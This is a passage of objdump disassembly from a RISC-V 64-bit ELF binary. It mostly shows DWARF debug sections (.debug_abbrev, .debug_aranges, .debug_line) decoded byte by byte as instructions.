    24a6:	0100                	addi	s0,sp,128
    24a8:	3c28                	fld	fa0,120(s0)
    24aa:	00001733          	sll	a4,zero,zero
    24ae:	9102                	jalr	sp
    24b0:	0058                	addi	a4,sp,4
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	490b3b0b          	0x490b3b0b
  28:	04000013          	li	zero,64
  2c:	0024                	addi	s1,sp,8
  2e:	0b3e0b0b          	0xb3e0b0b
  32:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  36:	1605                	addi	a2,a2,-31
  38:	0300                	addi	s0,sp,384
  3a:	3a0e                	fld	fs4,224(sp)
  3c:	49053b0b          	0x49053b0b
  40:	06000013          	li	zero,96
  44:	0b0b0117          	auipc	sp,0xb0b0
  48:	0b3a                	slli	s6,s6,0xe
  4a:	13010b3b          	0x13010b3b
  4e:	0000                	unimp
  50:	03000d07          	0x3000d07
  54:	3a0e                	fld	fs4,224(sp)
  56:	490b3b0b          	0x490b3b0b
  5a:	08000013          	li	zero,128
  5e:	0101                	addi	sp,sp,0
  60:	1349                	addi	t1,t1,-14
  62:	1301                	addi	t1,t1,-32
  64:	0000                	unimp
  66:	2109                	addiw	sp,sp,2
  68:	4900                	lw	s0,16(a0)
  6a:	000b2f13          	slti	t5,s6,0
  6e:	0a00                	addi	s0,sp,272
  70:	0b0b0113          	addi	sp,s6,176
  74:	0b3a                	slli	s6,s6,0xe
  76:	13010b3b          	0x13010b3b
  7a:	0000                	unimp
  7c:	03000d0b          	0x3000d0b
  80:	3a0e                	fld	fs4,224(sp)
  82:	490b3b0b          	0x490b3b0b
  86:	000b3813          	sltiu	a6,s6,0
  8a:	0c00                	addi	s0,sp,528
  8c:	0b0b000f          	0xb0b000f
  90:	0000                	unimp
  92:	130d                	addi	t1,t1,-29
  94:	0301                	addi	t1,t1,0
  96:	0b0e                	slli	s6,s6,0x3
  98:	3b0b3a0b          	0x3b0b3a0b
  9c:	0013010b          	0x13010b
  a0:	0e00                	addi	s0,sp,784
  a2:	000d                	c.nop	3
  a4:	0b3a0803          	lb	a6,179(s4) # 1660b3 <_tbss_end+0x16602f>
  a8:	13490b3b          	0x13490b3b
  ac:	0b38                	addi	a4,sp,408
  ae:	0000                	unimp
  b0:	0b000f0f          	0xb000f0f
  b4:	0013490b          	0x13490b
  b8:	1000                	addi	s0,sp,32
  ba:	0e030113          	addi	sp,t1,224
  be:	0b3a050b          	0xb3a050b
  c2:	13010b3b          	0x13010b3b
  c6:	0000                	unimp
  c8:	0d11                	addi	s10,s10,4
  ca:	0300                	addi	s0,sp,384
  cc:	3a0e                	fld	fs4,224(sp)
  ce:	490b3b0b          	0x490b3b0b
  d2:	00053813          	sltiu	a6,a0,0
  d6:	1200                	addi	s0,sp,288
  d8:	0015                	c.nop	5
  da:	00001927          	0x1927
  de:	27011513          	0x27011513
  e2:	4919                	li	s2,6
  e4:	00130113          	addi	sp,t1,1
  e8:	1400                	addi	s0,sp,544
  ea:	0005                	c.nop	1
  ec:	1349                	addi	t1,t1,-14
  ee:	0000                	unimp
  f0:	2615                	addiw	a2,a2,5
  f2:	4900                	lw	s0,16(a0)
  f4:	16000013          	li	zero,352
  f8:	0e030113          	addi	sp,t1,224
  fc:	0b3a050b          	0xb3a050b
 100:	1301053b          	0x1301053b
 104:	0000                	unimp
 106:	03000d17          	auipc	s10,0x3000
 10a:	3a0e                	fld	fs4,224(sp)
 10c:	49053b0b          	0x49053b0b
 110:	000b3813          	sltiu	a6,s6,0
 114:	1800                	addi	s0,sp,48
 116:	000d                	c.nop	3
 118:	0b3a0e03          	lb	t3,179(s4)
 11c:	1349053b          	0x1349053b
 120:	0538                	addi	a4,sp,648
 122:	0000                	unimp
 124:	1319                	addi	t1,t1,-26
 126:	0301                	addi	t1,t1,0
 128:	0b0e                	slli	s6,s6,0x3
 12a:	3b0b3a0b          	0x3b0b3a0b
 12e:	0105                	addi	sp,sp,1
 130:	1a000013          	li	zero,416
 134:	0b0b0113          	addi	sp,s6,176
 138:	0b3a                	slli	s6,s6,0xe
 13a:	1301053b          	0x1301053b
 13e:	0000                	unimp
 140:	0b01131b          	0xb01131b
 144:	3a05                	addiw	s4,s4,-31
 146:	01053b0b          	0x1053b0b
 14a:	1c000013          	li	zero,448
 14e:	050b0117          	auipc	sp,0x50b0
 152:	0b3a                	slli	s6,s6,0xe
 154:	1301053b          	0x1301053b
 158:	0000                	unimp
 15a:	0d1d                	addi	s10,s10,7
 15c:	0300                	addi	s0,sp,384
 15e:	3a0e                	fld	fs4,224(sp)
 160:	49053b0b          	0x49053b0b
 164:	1e000013          	li	zero,480
 168:	0e030013          	addi	zero,t1,224
 16c:	193c                	addi	a5,sp,184
 16e:	0000                	unimp
 170:	151f 2701 0119      	0x1192701151f
 176:	20000013          	li	zero,512
 17a:	0034                	addi	a3,sp,8
 17c:	0b3a0e03          	lb	t3,179(s4)
 180:	1349053b          	0x1349053b
 184:	193c193f 21210000 	0x21210000193c193f
 18c:	4900                	lw	s0,16(a0)
 18e:	00062f13          	slti	t5,a2,0
 192:	2200                	fld	fs0,0(a2)
 194:	0034                	addi	a3,sp,8
 196:	0b3a0e03          	lb	t3,179(s4)
 19a:	13490b3b          	0x13490b3b
 19e:	1802193f 21230000 	0x212300001802193f
 1a6:	4900                	lw	s0,16(a0)
 1a8:	00052f13          	slti	t5,a0,0
 1ac:	2400                	fld	fs0,8(s0)
 1ae:	012e                	slli	sp,sp,0xb
 1b0:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 1b8:	13491927          	0x13491927
 1bc:	0111                	addi	sp,sp,4
 1be:	0712                	slli	a4,a4,0x4
 1c0:	1840                	addi	s0,sp,52
 1c2:	4296                	lw	t0,68(sp)
 1c4:	0119                	addi	sp,sp,6
 1c6:	25000013          	li	zero,592
 1ca:	0034                	addi	a3,sp,8
 1cc:	0b3a0e03          	lb	t3,179(s4)
 1d0:	13490b3b          	0x13490b3b
 1d4:	1802                	slli	a6,a6,0x20
 1d6:	0000                	unimp
 1d8:	0b26                	slli	s6,s6,0x9
 1da:	1101                	addi	sp,sp,-32
 1dc:	1201                	addi	tp,tp,-32
 1de:	27000007          	0x27000007
 1e2:	0111010b          	0x111010b
 1e6:	0712                	slli	a4,a4,0x4
 1e8:	1301                	addi	t1,t1,-32
 1ea:	0000                	unimp
 1ec:	3428                	fld	fa0,104(s0)
 1ee:	0300                	addi	s0,sp,384
 1f0:	3a08                	fld	fa0,48(a2)
 1f2:	490b3b0b          	0x490b3b0b
 1f6:	00180213          	addi	tp,a6,1
 1fa:	2900                	fld	fs0,16(a0)
 1fc:	012e                	slli	sp,sp,0xb
 1fe:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 206:	01111927          	0x1111927
 20a:	0712                	slli	a4,a4,0x4
 20c:	1840                	addi	s0,sp,52
 20e:	4296                	lw	t0,68(sp)
 210:	0119                	addi	sp,sp,6
 212:	2a000013          	li	zero,672
 216:	0005                	c.nop	1
 218:	0b3a0e03          	lb	t3,179(s4)
 21c:	13490b3b          	0x13490b3b
 220:	1802                	slli	a6,a6,0x20
 222:	0000                	unimp
 224:	3f012e2b          	0x3f012e2b
 228:	0319                	addi	t1,t1,6
 22a:	3a0e                	fld	fs4,224(sp)
 22c:	3c0b3b0b          	0x3c0b3b0b
 230:	0119                	addi	sp,sp,6
 232:	2c000013          	li	zero,704
 236:	0018                	0x18
 238:	0000                	unimp
 23a:	2e2d                	addiw	t3,t3,11
 23c:	3f01                	addiw	t5,t5,-32
 23e:	0319                	addi	t1,t1,6
 240:	3a0e                	fld	fs4,224(sp)
 242:	270b3b0b          	0x270b3b0b
 246:	1119                	addi	sp,sp,-26
 248:	1201                	addi	tp,tp,-32
 24a:	97184007          	flq	ft0,-1679(a6)
 24e:	1942                	slli	s2,s2,0x30
 250:	1301                	addi	t1,t1,-32
 252:	0000                	unimp
 254:	2e2e                	fld	ft8,200(sp)
 256:	3f01                	addiw	t5,t5,-32
 258:	0319                	addi	t1,t1,6
 25a:	3a0e                	fld	fs4,224(sp)
 25c:	270b3b0b          	0x270b3b0b
 260:	1119                	addi	sp,sp,-26
 262:	1201                	addi	tp,tp,-32
 264:	97184007          	flq	ft0,-1679(a6)
 268:	1942                	slli	s2,s2,0x30
 26a:	0000                	unimp
 26c:	0300052f          	0x300052f
 270:	3a08                	fld	fa0,48(a2)
 272:	490b3b0b          	0x490b3b0b
 276:	00180213          	addi	tp,a6,1
 27a:	0000                	unimp
 27c:	1101                	addi	sp,sp,-32
 27e:	1000                	addi	s0,sp,32
 280:	1106                	slli	sp,sp,0x21
 282:	1201                	addi	tp,tp,-32
 284:	0301                	addi	t1,t1,0
 286:	1b0e                	slli	s6,s6,0x23
 288:	250e                	fld	fa0,192(sp)
 28a:	130e                	slli	t1,t1,0x23
 28c:	0005                	c.nop	1
 28e:	0000                	unimp
 290:	1101                	addi	sp,sp,-32
 292:	1000                	addi	s0,sp,32
 294:	1106                	slli	sp,sp,0x21
 296:	1201                	addi	tp,tp,-32
 298:	0301                	addi	t1,t1,0
 29a:	1b0e                	slli	s6,s6,0x23
 29c:	250e                	fld	fa0,192(sp)
 29e:	130e                	slli	t1,t1,0x23
 2a0:	0005                	c.nop	1
 2a2:	0000                	unimp
 2a4:	1101                	addi	sp,sp,-32
 2a6:	2501                	sext.w	a0,a0
 2a8:	130e                	slli	t1,t1,0x23
 2aa:	1b0e030b          	0x1b0e030b
 2ae:	110e                	slli	sp,sp,0x23
 2b0:	1201                	addi	tp,tp,-32
 2b2:	00171007          	0x171007
 2b6:	0200                	addi	s0,sp,256
 2b8:	0024                	addi	s1,sp,8
 2ba:	0b3e0b0b          	0xb3e0b0b
 2be:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 2c2:	0b002403          	lw	s0,176(zero) # b0 <_tbss_end+0x2c>
 2c6:	030b3e0b          	0x30b3e0b
 2ca:	0008                	0x8
 2cc:	0400                	addi	s0,sp,512
 2ce:	0035                	c.nop	13
 2d0:	1349                	addi	t1,t1,-14
 2d2:	0000                	unimp
 2d4:	2605                	addiw	a2,a2,1
 2d6:	4900                	lw	s0,16(a0)
 2d8:	06000013          	li	zero,96
 2dc:	0016                	c.slli	zero,0x5
 2de:	0b3a0e03          	lb	t3,179(s4)
 2e2:	0b390b3b          	0xb390b3b
 2e6:	1349                	addi	t1,t1,-14
 2e8:	0000                	unimp
 2ea:	03001607          	0x3001607
 2ee:	3a0e                	fld	fs4,224(sp)
 2f0:	39053b0b          	0x39053b0b
 2f4:	0013490b          	0x13490b
 2f8:	0800                	addi	s0,sp,16
 2fa:	0b0b0117          	auipc	sp,0xb0b0
 2fe:	0b3a                	slli	s6,s6,0xe
 300:	0b390b3b          	0xb390b3b
 304:	1301                	addi	t1,t1,-32
 306:	0000                	unimp
 308:	0d09                	addi	s10,s10,2
 30a:	0300                	addi	s0,sp,384
 30c:	3a0e                	fld	fs4,224(sp)
 30e:	390b3b0b          	0x390b3b0b
 312:	0013490b          	0x13490b
 316:	0a00                	addi	s0,sp,272
 318:	0101                	addi	sp,sp,0
 31a:	1349                	addi	t1,t1,-14
 31c:	1301                	addi	t1,t1,-32
 31e:	0000                	unimp
 320:	4900210b          	0x4900210b
 324:	000b2f13          	slti	t5,s6,0
 328:	0c00                	addi	s0,sp,528
 32a:	0b0b0113          	addi	sp,s6,176
 32e:	0b3a                	slli	s6,s6,0xe
 330:	0b390b3b          	0xb390b3b
 334:	1301                	addi	t1,t1,-32
 336:	0000                	unimp
 338:	0d0d                	addi	s10,s10,3
 33a:	0300                	addi	s0,sp,384
 33c:	3a0e                	fld	fs4,224(sp)
 33e:	390b3b0b          	0x390b3b0b
 342:	3813490b          	0x3813490b
 346:	0e00000b          	0xe00000b
 34a:	0b0b000f          	0xb0b000f
 34e:	0000                	unimp
 350:	0b000f0f          	0xb000f0f
 354:	000e030b          	0xe030b
 358:	1000                	addi	s0,sp,32
 35a:	0e030113          	addi	sp,t1,224
 35e:	0b3a0b0b          	0xb3a0b0b
 362:	0b390b3b          	0xb390b3b
 366:	1301                	addi	t1,t1,-32
 368:	0000                	unimp
 36a:	0d11                	addi	s10,s10,4
 36c:	0300                	addi	s0,sp,384
 36e:	3a08                	fld	fa0,48(a2)
 370:	390b3b0b          	0x390b3b0b
 374:	3813490b          	0x3813490b
 378:	1200000b          	0x1200000b
 37c:	0b0b000f          	0xb0b000f
 380:	1349                	addi	t1,t1,-14
 382:	0000                	unimp
 384:	03011313          	slli	t1,sp,0x30
 388:	0b0e                	slli	s6,s6,0x3
 38a:	3a05                	addiw	s4,s4,-31
 38c:	390b3b0b          	0x390b3b0b
 390:	0013010b          	0x13010b
 394:	1400                	addi	s0,sp,544
 396:	000d                	c.nop	3
 398:	0b3a0e03          	lb	t3,179(s4)
 39c:	0b390b3b          	0xb390b3b
 3a0:	1349                	addi	t1,t1,-14
 3a2:	0538                	addi	a4,sp,648
 3a4:	0000                	unimp
 3a6:	1515                	addi	a0,a0,-27
 3a8:	2700                	fld	fs0,8(a4)
 3aa:	0019                	c.nop	6
 3ac:	1600                	addi	s0,sp,800
 3ae:	0115                	addi	sp,sp,5
 3b0:	13491927          	0x13491927
 3b4:	1301                	addi	t1,t1,-32
 3b6:	0000                	unimp
 3b8:	49000517          	auipc	a0,0x49000
 3bc:	18000013          	li	zero,384
 3c0:	0e030113          	addi	sp,t1,224
 3c4:	0b3a050b          	0xb3a050b
 3c8:	0b39053b          	0xb39053b
 3cc:	1301                	addi	t1,t1,-32
 3ce:	0000                	unimp
 3d0:	0d19                	addi	s10,s10,6
 3d2:	0300                	addi	s0,sp,384
 3d4:	3a0e                	fld	fs4,224(sp)
 3d6:	39053b0b          	0x39053b0b
 3da:	3813490b          	0x3813490b
 3de:	1a00000b          	0x1a00000b
 3e2:	000d                	c.nop	3
 3e4:	0b3a0e03          	lb	t3,179(s4)
 3e8:	0b39053b          	0xb39053b
 3ec:	1349                	addi	t1,t1,-14
 3ee:	0538                	addi	a4,sp,648
 3f0:	0000                	unimp
 3f2:	0301131b          	0x301131b
 3f6:	0b0e                	slli	s6,s6,0x3
 3f8:	3b0b3a0b          	0x3b0b3a0b
 3fc:	3905                	addiw	s2,s2,-31
 3fe:	0013010b          	0x13010b
 402:	1c00                	addi	s0,sp,560
 404:	0b0b0113          	addi	sp,s6,176
 408:	0b3a                	slli	s6,s6,0xe
 40a:	0b39053b          	0xb39053b
 40e:	1301                	addi	t1,t1,-32
 410:	0000                	unimp
 412:	131d                	addi	t1,t1,-25
 414:	0b01                	addi	s6,s6,0
 416:	3a05                	addiw	s4,s4,-31
 418:	39053b0b          	0x39053b0b
 41c:	0013010b          	0x13010b
 420:	1e00                	addi	s0,sp,816
 422:	050b0117          	auipc	sp,0x50b0
 426:	0b3a                	slli	s6,s6,0xe
 428:	0b39053b          	0xb39053b
 42c:	1301                	addi	t1,t1,-32
 42e:	0000                	unimp
 430:	0d1f 0300 3a0e      	0x3a0e03000d1f
 436:	39053b0b          	0x39053b0b
 43a:	0013490b          	0x13490b
 43e:	2000                	fld	fs0,0(s0)
 440:	0e030013          	addi	zero,t1,224
 444:	193c                	addi	a5,sp,184
 446:	0000                	unimp
 448:	1521                	addi	a0,a0,-24
 44a:	2701                	sext.w	a4,a4
 44c:	0119                	addi	sp,sp,6
 44e:	22000013          	li	zero,544
 452:	0034                	addi	a3,sp,8
 454:	0b3a0e03          	lb	t3,179(s4)
 458:	0b39053b          	0xb39053b
 45c:	1349                	addi	t1,t1,-14
 45e:	193c193f 34230000 	0x34230000193c193f
 466:	0300                	addi	s0,sp,384
 468:	3a0e                	fld	fs4,224(sp)
 46a:	390b3b0b          	0x390b3b0b
 46e:	3f13490b          	0x3f13490b
 472:	3c19                	addiw	s8,s8,-26
 474:	0019                	c.nop	6
 476:	2400                	fld	fs0,8(s0)
 478:	0034                	addi	a3,sp,8
 47a:	0b3a0e03          	lb	t3,179(s4)
 47e:	0b390b3b          	0xb390b3b
 482:	1349                	addi	t1,t1,-14
 484:	1802                	slli	a6,a6,0x20
 486:	0000                	unimp
 488:	2e25                	addiw	t3,t3,9
 48a:	3f01                	addiw	t5,t5,-32
 48c:	0319                	addi	t1,t1,6
 48e:	3a0e                	fld	fs4,224(sp)
 490:	39053b0b          	0x39053b0b
 494:	4919270b          	0x4919270b
 498:	12011113          	0x12011113
 49c:	97184007          	flq	ft0,-1679(a6)
 4a0:	1942                	slli	s2,s2,0x30
 4a2:	1301                	addi	t1,t1,-32
 4a4:	0000                	unimp
 4a6:	0526                	slli	a0,a0,0x9
 4a8:	0300                	addi	s0,sp,384
 4aa:	3a08                	fld	fa0,48(a2)
 4ac:	39053b0b          	0x39053b0b
 4b0:	0213490b          	0x213490b
 4b4:	0018                	0x18
 4b6:	2700                	fld	fs0,8(a4)
 4b8:	0034                	addi	a3,sp,8
 4ba:	0b3a0803          	lb	a6,179(s4)
 4be:	0b39053b          	0xb39053b
 4c2:	1349                	addi	t1,t1,-14
 4c4:	1802                	slli	a6,a6,0x20
 4c6:	0000                	unimp
 4c8:	3428                	fld	fa0,104(s0)
 4ca:	0300                	addi	s0,sp,384
 4cc:	3a0e                	fld	fs4,224(sp)
 4ce:	39053b0b          	0x39053b0b
 4d2:	0213490b          	0x213490b
 4d6:	0018                	0x18
 4d8:	2900                	fld	fs0,16(a0)
 4da:	012e                	slli	sp,sp,0xb
 4dc:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 4e4:	0b39                	addi	s6,s6,14
 4e6:	13491927          	0x13491927
 4ea:	0111                	addi	sp,sp,4
 4ec:	0712                	slli	a4,a4,0x4
 4ee:	1840                	addi	s0,sp,52
 4f0:	01194297          	auipc	t0,0x1194
 4f4:	2a000013          	li	zero,672
 4f8:	0005                	c.nop	1
 4fa:	0b3a0e03          	lb	t3,179(s4)
 4fe:	0b39053b          	0xb39053b
 502:	1349                	addi	t1,t1,-14
 504:	1802                	slli	a6,a6,0x20
 506:	0000                	unimp
 508:	11010b2b          	0x11010b2b
 50c:	1201                	addi	tp,tp,-32
 50e:	00130107          	0x130107
 512:	2c00                	fld	fs0,24(s0)
 514:	0111010b          	0x111010b
 518:	0712                	slli	a4,a4,0x4
 51a:	0000                	unimp
 51c:	262d                	addiw	a2,a2,11
 51e:	0000                	unimp
 520:	2e00                	fld	fs0,24(a2)
 522:	012e                	slli	sp,sp,0xb
 524:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 52c:	0b39                	addi	s6,s6,14
 52e:	13491927          	0x13491927
 532:	0111                	addi	sp,sp,4
 534:	0712                	slli	a4,a4,0x4
 536:	1840                	addi	s0,sp,52
 538:	4296                	lw	t0,68(sp)
 53a:	0119                	addi	sp,sp,6
 53c:	2f000013          	li	zero,752
 540:	0018                	0x18
 542:	0000                	unimp
 544:	2e30                	fld	fa2,88(a2)
 546:	0301                	addi	t1,t1,0
 548:	3a0e                	fld	fs4,224(sp)
 54a:	39053b0b          	0x39053b0b
 54e:	1119270b          	0x1119270b
 552:	1201                	addi	tp,tp,-32
 554:	48184007          	flq	ft0,1153(a6)
 558:	9718                	0x9718
 55a:	1942                	slli	s2,s2,0x30
 55c:	0000                	unimp
 55e:	2e31                	addiw	t3,t3,12
 560:	0301                	addi	t1,t1,0
 562:	3a0e                	fld	fs4,224(sp)
 564:	390b3b0b          	0x390b3b0b
 568:	1119270b          	0x1119270b
 56c:	1201                	addi	tp,tp,-32
 56e:	96184007          	flq	ft0,-1695(a6)
 572:	1942                	slli	s2,s2,0x30
 574:	1301                	addi	t1,t1,-32
 576:	0000                	unimp
 578:	0532                	slli	a0,a0,0xc
 57a:	0300                	addi	s0,sp,384
 57c:	3a0e                	fld	fs4,224(sp)
 57e:	390b3b0b          	0x390b3b0b
 582:	0213490b          	0x213490b
 586:	0018                	0x18
 588:	3300                	fld	fs0,32(a4)
 58a:	0005                	c.nop	1
 58c:	0b3a0803          	lb	a6,179(s4)
 590:	0b390b3b          	0xb390b3b
 594:	1349                	addi	t1,t1,-14
 596:	1802                	slli	a6,a6,0x20
 598:	0000                	unimp
 59a:	3434                	fld	fa3,104(s0)
 59c:	0300                	addi	s0,sp,384
 59e:	3a08                	fld	fa0,48(a2)
 5a0:	390b3b0b          	0x390b3b0b
 5a4:	0213490b          	0x213490b
 5a8:	0018                	0x18
 5aa:	3500                	fld	fs0,40(a0)
 5ac:	0034                	addi	a3,sp,8
 5ae:	0b3a0803          	lb	a6,179(s4)
 5b2:	0b390b3b          	0xb390b3b
 5b6:	1349                	addi	t1,t1,-14
 5b8:	0000                	unimp
 5ba:	0a36                	slli	s4,s4,0xd
 5bc:	0300                	addi	s0,sp,384
 5be:	3a0e                	fld	fs4,224(sp)
 5c0:	390b3b0b          	0x390b3b0b
 5c4:	0001110b          	0x1110b
 5c8:	3700                	fld	fs0,40(a4)
 5ca:	000a                	c.slli	zero,0x2
 5cc:	0b3a0e03          	lb	t3,179(s4)
 5d0:	0b39053b          	0xb39053b
 5d4:	0111                	addi	sp,sp,4
 5d6:	0000                	unimp
 5d8:	2e38                	fld	fa4,88(a2)
 5da:	0301                	addi	t1,t1,0
 5dc:	3a0e                	fld	fs4,224(sp)
 5de:	390b3b0b          	0x390b3b0b
 5e2:	4919270b          	0x4919270b
 5e6:	12011113          	0x12011113
 5ea:	97184007          	flq	ft0,-1679(a6)
 5ee:	1942                	slli	s2,s2,0x30
 5f0:	1301                	addi	t1,t1,-32
 5f2:	0000                	unimp
 5f4:	2e39                	addiw	t3,t3,14
 5f6:	3f01                	addiw	t5,t5,-32
 5f8:	0319                	addi	t1,t1,6
 5fa:	3a0e                	fld	fs4,224(sp)
 5fc:	390b3b0b          	0x390b3b0b
 600:	1119270b          	0x1119270b
 604:	1201                	addi	tp,tp,-32
 606:	96184007          	flq	ft0,-1695(a6)
 60a:	1942                	slli	s2,s2,0x30
 60c:	1301                	addi	t1,t1,-32
 60e:	0000                	unimp
 610:	343a                	fld	fs0,424(sp)
 612:	0300                	addi	s0,sp,384
 614:	3a08                	fld	fa0,48(a2)
 616:	390b3b0b          	0x390b3b0b
 61a:	8813490b          	0x8813490b
 61e:	0b01                	addi	s6,s6,0
 620:	0000                	unimp
 622:	0300343b          	0x300343b
 626:	3a0e                	fld	fs4,224(sp)
 628:	390b3b0b          	0x390b3b0b
 62c:	0013490b          	0x13490b
 630:	3c00                	fld	fs0,56(s0)
 632:	0034                	addi	a3,sp,8
 634:	0b3a0803          	lb	a6,179(s4)
 638:	0b390b3b          	0xb390b3b
 63c:	1349                	addi	t1,t1,-14
 63e:	0188                	addi	a0,sp,192
 640:	0018020b          	0x18020b
 644:	3d00                	fld	fs0,56(a0)
 646:	012e                	slli	sp,sp,0xb
 648:	0b3a0e03          	lb	t3,179(s4)
 64c:	0b390b3b          	0xb390b3b
 650:	0111                	addi	sp,sp,4
 652:	0712                	slli	a4,a4,0x4
 654:	1840                	addi	s0,sp,52
 656:	4296                	lw	t0,68(sp)
 658:	0119                	addi	sp,sp,6
 65a:	3e000013          	li	zero,992
 65e:	012e                	slli	sp,sp,0xb
 660:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 668:	0b39                	addi	s6,s6,14
 66a:	01111927          	0x1111927
 66e:	0712                	slli	a4,a4,0x4
 670:	1840                	addi	s0,sp,52
 672:	01194297          	auipc	t0,0x1194
 676:	3f000013          	li	zero,1008
 67a:	002e                	c.slli	zero,0xb
 67c:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 684:	0b39                	addi	s6,s6,14
 686:	0111                	addi	sp,sp,4
 688:	0712                	slli	a4,a4,0x4
 68a:	1840                	addi	s0,sp,52
 68c:	4296                	lw	t0,68(sp)
 68e:	0019                	c.nop	6
 690:	4000                	lw	s0,0(s0)
 692:	012e                	slli	sp,sp,0xb
 694:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 69c:	0b39                	addi	s6,s6,14
 69e:	01871927          	0x1871927
 6a2:	1119                	addi	sp,sp,-26
 6a4:	1201                	addi	tp,tp,-32
 6a6:	96184007          	flq	ft0,-1695(a6)
 6aa:	1942                	slli	s2,s2,0x30
 6ac:	1301                	addi	t1,t1,-32
 6ae:	0000                	unimp
 6b0:	2e41                	addiw	t3,t3,16
 6b2:	3f01                	addiw	t5,t5,-32
 6b4:	0319                	addi	t1,t1,6
 6b6:	3a0e                	fld	fs4,224(sp)
 6b8:	390b3b0b          	0x390b3b0b
 6bc:	8719270b          	0x8719270b
 6c0:	1901                	addi	s2,s2,-32
 6c2:	0111                	addi	sp,sp,4
 6c4:	0712                	slli	a4,a4,0x4
 6c6:	1840                	addi	s0,sp,52
 6c8:	01194297          	auipc	t0,0x1194
 6cc:	42000013          	li	zero,1056
 6d0:	0034                	addi	a3,sp,8
 6d2:	0b3a0e03          	lb	t3,179(s4)
 6d6:	0b390b3b          	0xb390b3b
 6da:	1349                	addi	t1,t1,-14
 6dc:	0188                	addi	a0,sp,192
 6de:	0018020b          	0x18020b
 6e2:	4300                	lw	s0,0(a4)
 6e4:	012e                	slli	sp,sp,0xb
 6e6:	0b3a0e03          	lb	t3,179(s4)
 6ea:	0b390b3b          	0xb390b3b
 6ee:	01111927          	0x1111927
 6f2:	0712                	slli	a4,a4,0x4
 6f4:	1840                	addi	s0,sp,52
 6f6:	01194297          	auipc	t0,0x1194
 6fa:	44000013          	li	zero,1088
 6fe:	012e                	slli	sp,sp,0xb
 700:	0b3a0e03          	lb	t3,179(s4)
 704:	0b390b3b          	0xb390b3b
 708:	01111927          	0x1111927
 70c:	0712                	slli	a4,a4,0x4
 70e:	1840                	addi	s0,sp,52
 710:	00194297          	auipc	t0,0x194
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli	zero,0x0
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	0494                	addi	a3,sp,576
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli	zero,0x0
  36:	0c8d                	addi	s9,s9,3
  38:	0000                	unimp
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli	zero,0x0
  66:	00000cbb          	addw	s9,zero,zero
  6a:	0008                	0x8
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	14dc                	addi	a5,sp,612
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli	zero,0x0
  96:	0ce9                	addi	s9,s9,26
  98:	0000                	unimp
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	150a                	slli	a0,a0,0x22
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	1214                	addi	a3,sp,288
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	03a5                	addi	t2,t2,9
       2:	0000                	unimp
       4:	0002                	c.slli	zero,0x0
       6:	0119                	addi	sp,sp,6
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	2f74706f          	j	47b1a <_tbss_end+0x47a96>
      28:	6972                	ld	s2,280(sp)
      2a:	36766373          	csrrsi	t1,0x367,12
      2e:	2f34                	fld	fa3,88(a4)
      30:	6972                	ld	s2,280(sp)
      32:	36766373          	csrrsi	t1,0x367,12
      36:	2d34                	fld	fa3,88(a0)
      38:	6e75                	lui	t3,0x1d
      3a:	776f6e6b          	0x776f6e6b
      3e:	2d6e                	fld	fs10,216(sp)
      40:	6c65                	lui	s8,0x19
      42:	2f66                	fld	ft10,88(sp)
      44:	6e69                	lui	t3,0x1a
      46:	64756c63          	bltu	a0,t2,69e <_tbss_end+0x61a>
      4a:	2f65                	addiw	t5,t5,25
      4c:	616d                	addi	sp,sp,240
      4e:	6e696863          	bltu	s2,t1,73e <_tbss_end+0x6ba>
      52:	0065                	c.nop	25
      54:	74706f2f          	0x74706f2f
      58:	7369722f          	0x7369722f
      5c:	34367663          	bleu	gp,a2,3a8 <_tbss_end+0x324>
      60:	7369722f          	0x7369722f
      64:	34367663          	bleu	gp,a2,3b0 <_tbss_end+0x32c>
